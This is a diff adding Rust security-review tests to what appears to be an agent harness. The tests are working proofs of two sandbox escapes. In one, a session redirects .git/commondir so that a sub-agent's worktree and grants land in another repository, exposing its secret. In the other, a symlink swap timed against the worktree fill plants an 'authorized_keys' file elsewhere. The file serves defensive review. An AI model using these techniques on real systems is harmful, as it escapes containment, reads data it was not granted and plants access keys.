@@ -1,0 +1,192 @@
+diff --git a/crates/node/src/git.rs b/crates/node/src/git.rs
+index 9ce6116..1390b70 100644
+--- a/crates/node/src/git.rs
++++ b/crates/node/src/git.rs
+@@ -3223,3 +3223,7 @@ mod cost_bench;
+ #[cfg(test)]
+ #[path = "git_bounds_tests.rs"]
+ mod bounds_tests;
++
++#[cfg(test)]
++#[path = "git_review_fixes.rs"]
++mod review_fixes;
+diff --git a/crates/node/src/git_review_fixes.rs b/crates/node/src/git_review_fixes.rs
+new file mode 100644
+index 0000000..3cc3cf7
+--- /dev/null
++++ b/crates/node/src/git_review_fixes.rs
+@@ -0,0 +1,174 @@
++//! GATE 3 FIX REVIEW PROOFS (docs/security-review/2026-11-gate3-fixes.md),
++//! against branch `fix/R.1-sandbox-findings`.
++//!
++//! Each test passes on that branch, and passing is the defect: it asserts
++//! that the attack worked. Invert the assertions when the finding is fixed.
++
++use super::*;
++
++fn sh(dir: &Path, args: &[&str]) -> String {
++    let o = std::process::Command::new("git")
++        .arg("-C")
++        .arg(dir)
++        .args(args)
++        .env("GIT_CONFIG_GLOBAL", "/dev/null")
++        .env("GIT_CONFIG_NOSYSTEM", "1")
++        .env("GIT_AUTHOR_NAME", "t")
++        .env("GIT_AUTHOR_EMAIL", "t@t")
++        .env("GIT_COMMITTER_NAME", "t")
++        .env("GIT_COMMITTER_EMAIL", "t@t")
++        .output()
++        .unwrap();
++    assert!(o.status.success(), "git {args:?}: {o:?}");
++    String::from_utf8_lossy(&o.stdout).into_owned()
++}
++
++/// `home/proj` (the session's repository), `home/other` (another repository
++/// of the same user, inside the same workspace root) and the node's data
++/// directory beside `home`.
++struct Layout {
++    _d: tempfile::TempDir,
++    home: PathBuf,
++    proj: PathBuf,
++    other: PathBuf,
++    base: PathBuf,
++    bounds: Bounds,
++}
++
++fn layout() -> Layout {
++    let d = tempfile::tempdir().unwrap();
++    let top = d.path().canonicalize().unwrap();
++    let home = top.join("home");
++    let proj = home.join("proj");
++    let other = home.join("other");
++    std::fs::create_dir_all(&proj).unwrap();
++    std::fs::create_dir_all(&other).unwrap();
++    sh(&other, &["init", "-q", "-b", "main"]);
++    std::fs::write(other.join("s.txt"), "OTHER-REPOSITORY-SECRET\n").unwrap();
++    sh(&other, &["add", "."]);
++    sh(&other, &["commit", "-qm", "init"]);
++    sh(&proj, &["init", "-q", "-b", "main"]);
++    std::fs::write(proj.join("a.txt"), "one\n").unwrap();
++    sh(&proj, &["add", "."]);
++    sh(&proj, &["commit", "-qm", "init"]);
++    let bounds = Bounds {
++        ceiling: Some(home.clone()),
++        protected: vec![top.join("data")],
++    };
++    Layout {
++        base: top.join("data/checkpoints"),
++        _d: d,
++        home,
++        proj,
++        other,
++        bounds,
++    }
++}
++
++/// R1-1. The folder a sub-agent's worktree is made in, and with it the
++/// child's sandbox grant, is `git rev-parse --git-common-dir` of the
++/// session's repository (`SubRepo::common`). The session's own `.git` is
++/// writable from its shell (R2), and one line in `.git/commondir` names
++/// another repository's git directory. The top level stays the session
++/// folder, so `find_repo` accepts it. The node's own git then makes the
++/// worktree inside the other repository's `.git`; the child session works
++/// there, and `sandbox::worktree_git` grants its shell read on all of that
++/// `.git` and write on its `objects`.
++#[tokio::test]
++async fn review_r1_1_commondir_puts_the_sub_agent_in_another_repository() {
++    let l = layout();
++    // What the session's shell does, inside its own folder:
++    std::fs::write(
++        l.proj.join(".git/commondir"),
++        format!("{}\n", l.other.join(".git").display()),
++    )
++    .unwrap();
++
++    let sub = sub_repo(&l.proj, Some(&l.base), &l.bounds)
++        .await
++        .unwrap()
++        .expect("accepted as the session's repository");
++    assert_eq!(sub.repo.root, l.proj, "the top level did not move");
++    let base = sub.base("c1").await.unwrap();
++    let wt = sub.make_worktree("c1", &base).await.unwrap();
++
++    // The child's folder is inside the other repository's git directory...
++    assert!(wt.path.starts_with(l.other.join(".git")), "{:?}", wt.path);
++    assert!(l.other.join(".git/worktrees/c1").is_dir());
++    // ...and so is what its sandbox is granted (read on `git`, write on
++    // `git/objects`), judged from the path alone.
++    let g = harness_tools::sandbox::worktree_git(&wt.path).unwrap();
++    assert_eq!(g.git, l.other.join(".git"));
++    // The child's own git, in its worktree, reads the other repository.
++    let shown = sh(&wt.path, &["show", "main:s.txt"]);
++    assert!(shown.contains("OTHER-REPOSITORY-SECRET"), "{shown}");
++    remove_worktree(&wt).await;
++    let _ = &l.home;
++}
++
++/// R1-2, the node's half. `make_worktree` checks the new worktree's pin
++/// and then starts `git checkout-index` with the worktree's *path* as work
++/// tree. The parent session's shell may write `<repo>/.git/harness-worktrees`
++/// (it is inside its own folder), so a process it left running swaps the
++/// folder for a link between the check and git's start. The node's own git,
++/// not sandboxed, then writes the parent's files into the link's target.
++///
++/// The swapper here is a thread that does what such a process can do with
++/// plain file system calls: wait for the worktree to appear, wait a little,
++/// rename it away and put a link in its place. Each delegation is one try;
++/// the test counts how many of `TRIES` wrote into the other folder.
++#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
++async fn review_r1_2_a_swap_during_the_worktree_fill_writes_into_another_folder() {
++    const TRIES: usize = 120;
++    let l = layout();
++    // A file name worth planting, in the parent's own folder.
++    std::fs::write(l.proj.join("authorized_keys"), "attacker-key\n").unwrap();
++    let victim = l.home.join("victim-dot-ssh");
++    std::fs::create_dir(&victim).unwrap();
++    let sub = sub_repo(&l.proj, Some(&l.base), &l.bounds)
++        .await
++        .unwrap()
++        .unwrap();
++    let mut wins = 0;
++    let mut refused = 0;
++    for i in 0..TRIES {
++        let child = format!("c{i}");
++        let base = sub.base(&child).await.unwrap();
++        let path = l.proj.join(".git/harness-worktrees").join(&child);
++        let (p, v) = (path.clone(), victim.clone());
++        // Delays swept over the window: 0.2 ms to 6 ms after it appears.
++        let delay = std::time::Duration::from_micros(200 + (i as u64 % 30) * 200);
++        let swapper = std::thread::spawn(move || {
++            let until = std::time::Instant::now() + std::time::Duration::from_secs(10);
++            while !p.join(".git").exists() {
++                if std::time::Instant::now() > until {
++                    return;
++                }
++                std::thread::yield_now();
++            }
++            std::thread::sleep(delay);
++            let away = p.with_extension("r");
++            if std::fs::rename(&p, &away).is_ok() {
++                let _ = std::os::unix::fs::symlink(&v, &p);
++            }
++        });
++        let made = sub.make_worktree(&child, &base).await;
++        swapper.join().unwrap();
++        match made {
++            Ok(wt) => remove_worktree(&wt).await,
++            Err(_) => refused += 1,
++        }
++        let _ = std::fs::remove_file(&path);
++        let _ = std::fs::remove_dir_all(path.with_extension("r"));
++        if victim.join("authorized_keys").exists() {
++            wins += 1;
++            std::fs::remove_file(victim.join("authorized_keys")).unwrap();
++            let _ = std::fs::remove_file(victim.join("a.txt"));
++        }
++    }
++    eprintln!(
++        "R1-2: {wins} of {TRIES} delegations wrote the parent's file into the other folder \
++         ({refused} were refused by the pin)"
++    );
++    assert!(wins > 0, "the swap never landed in the window");
++}
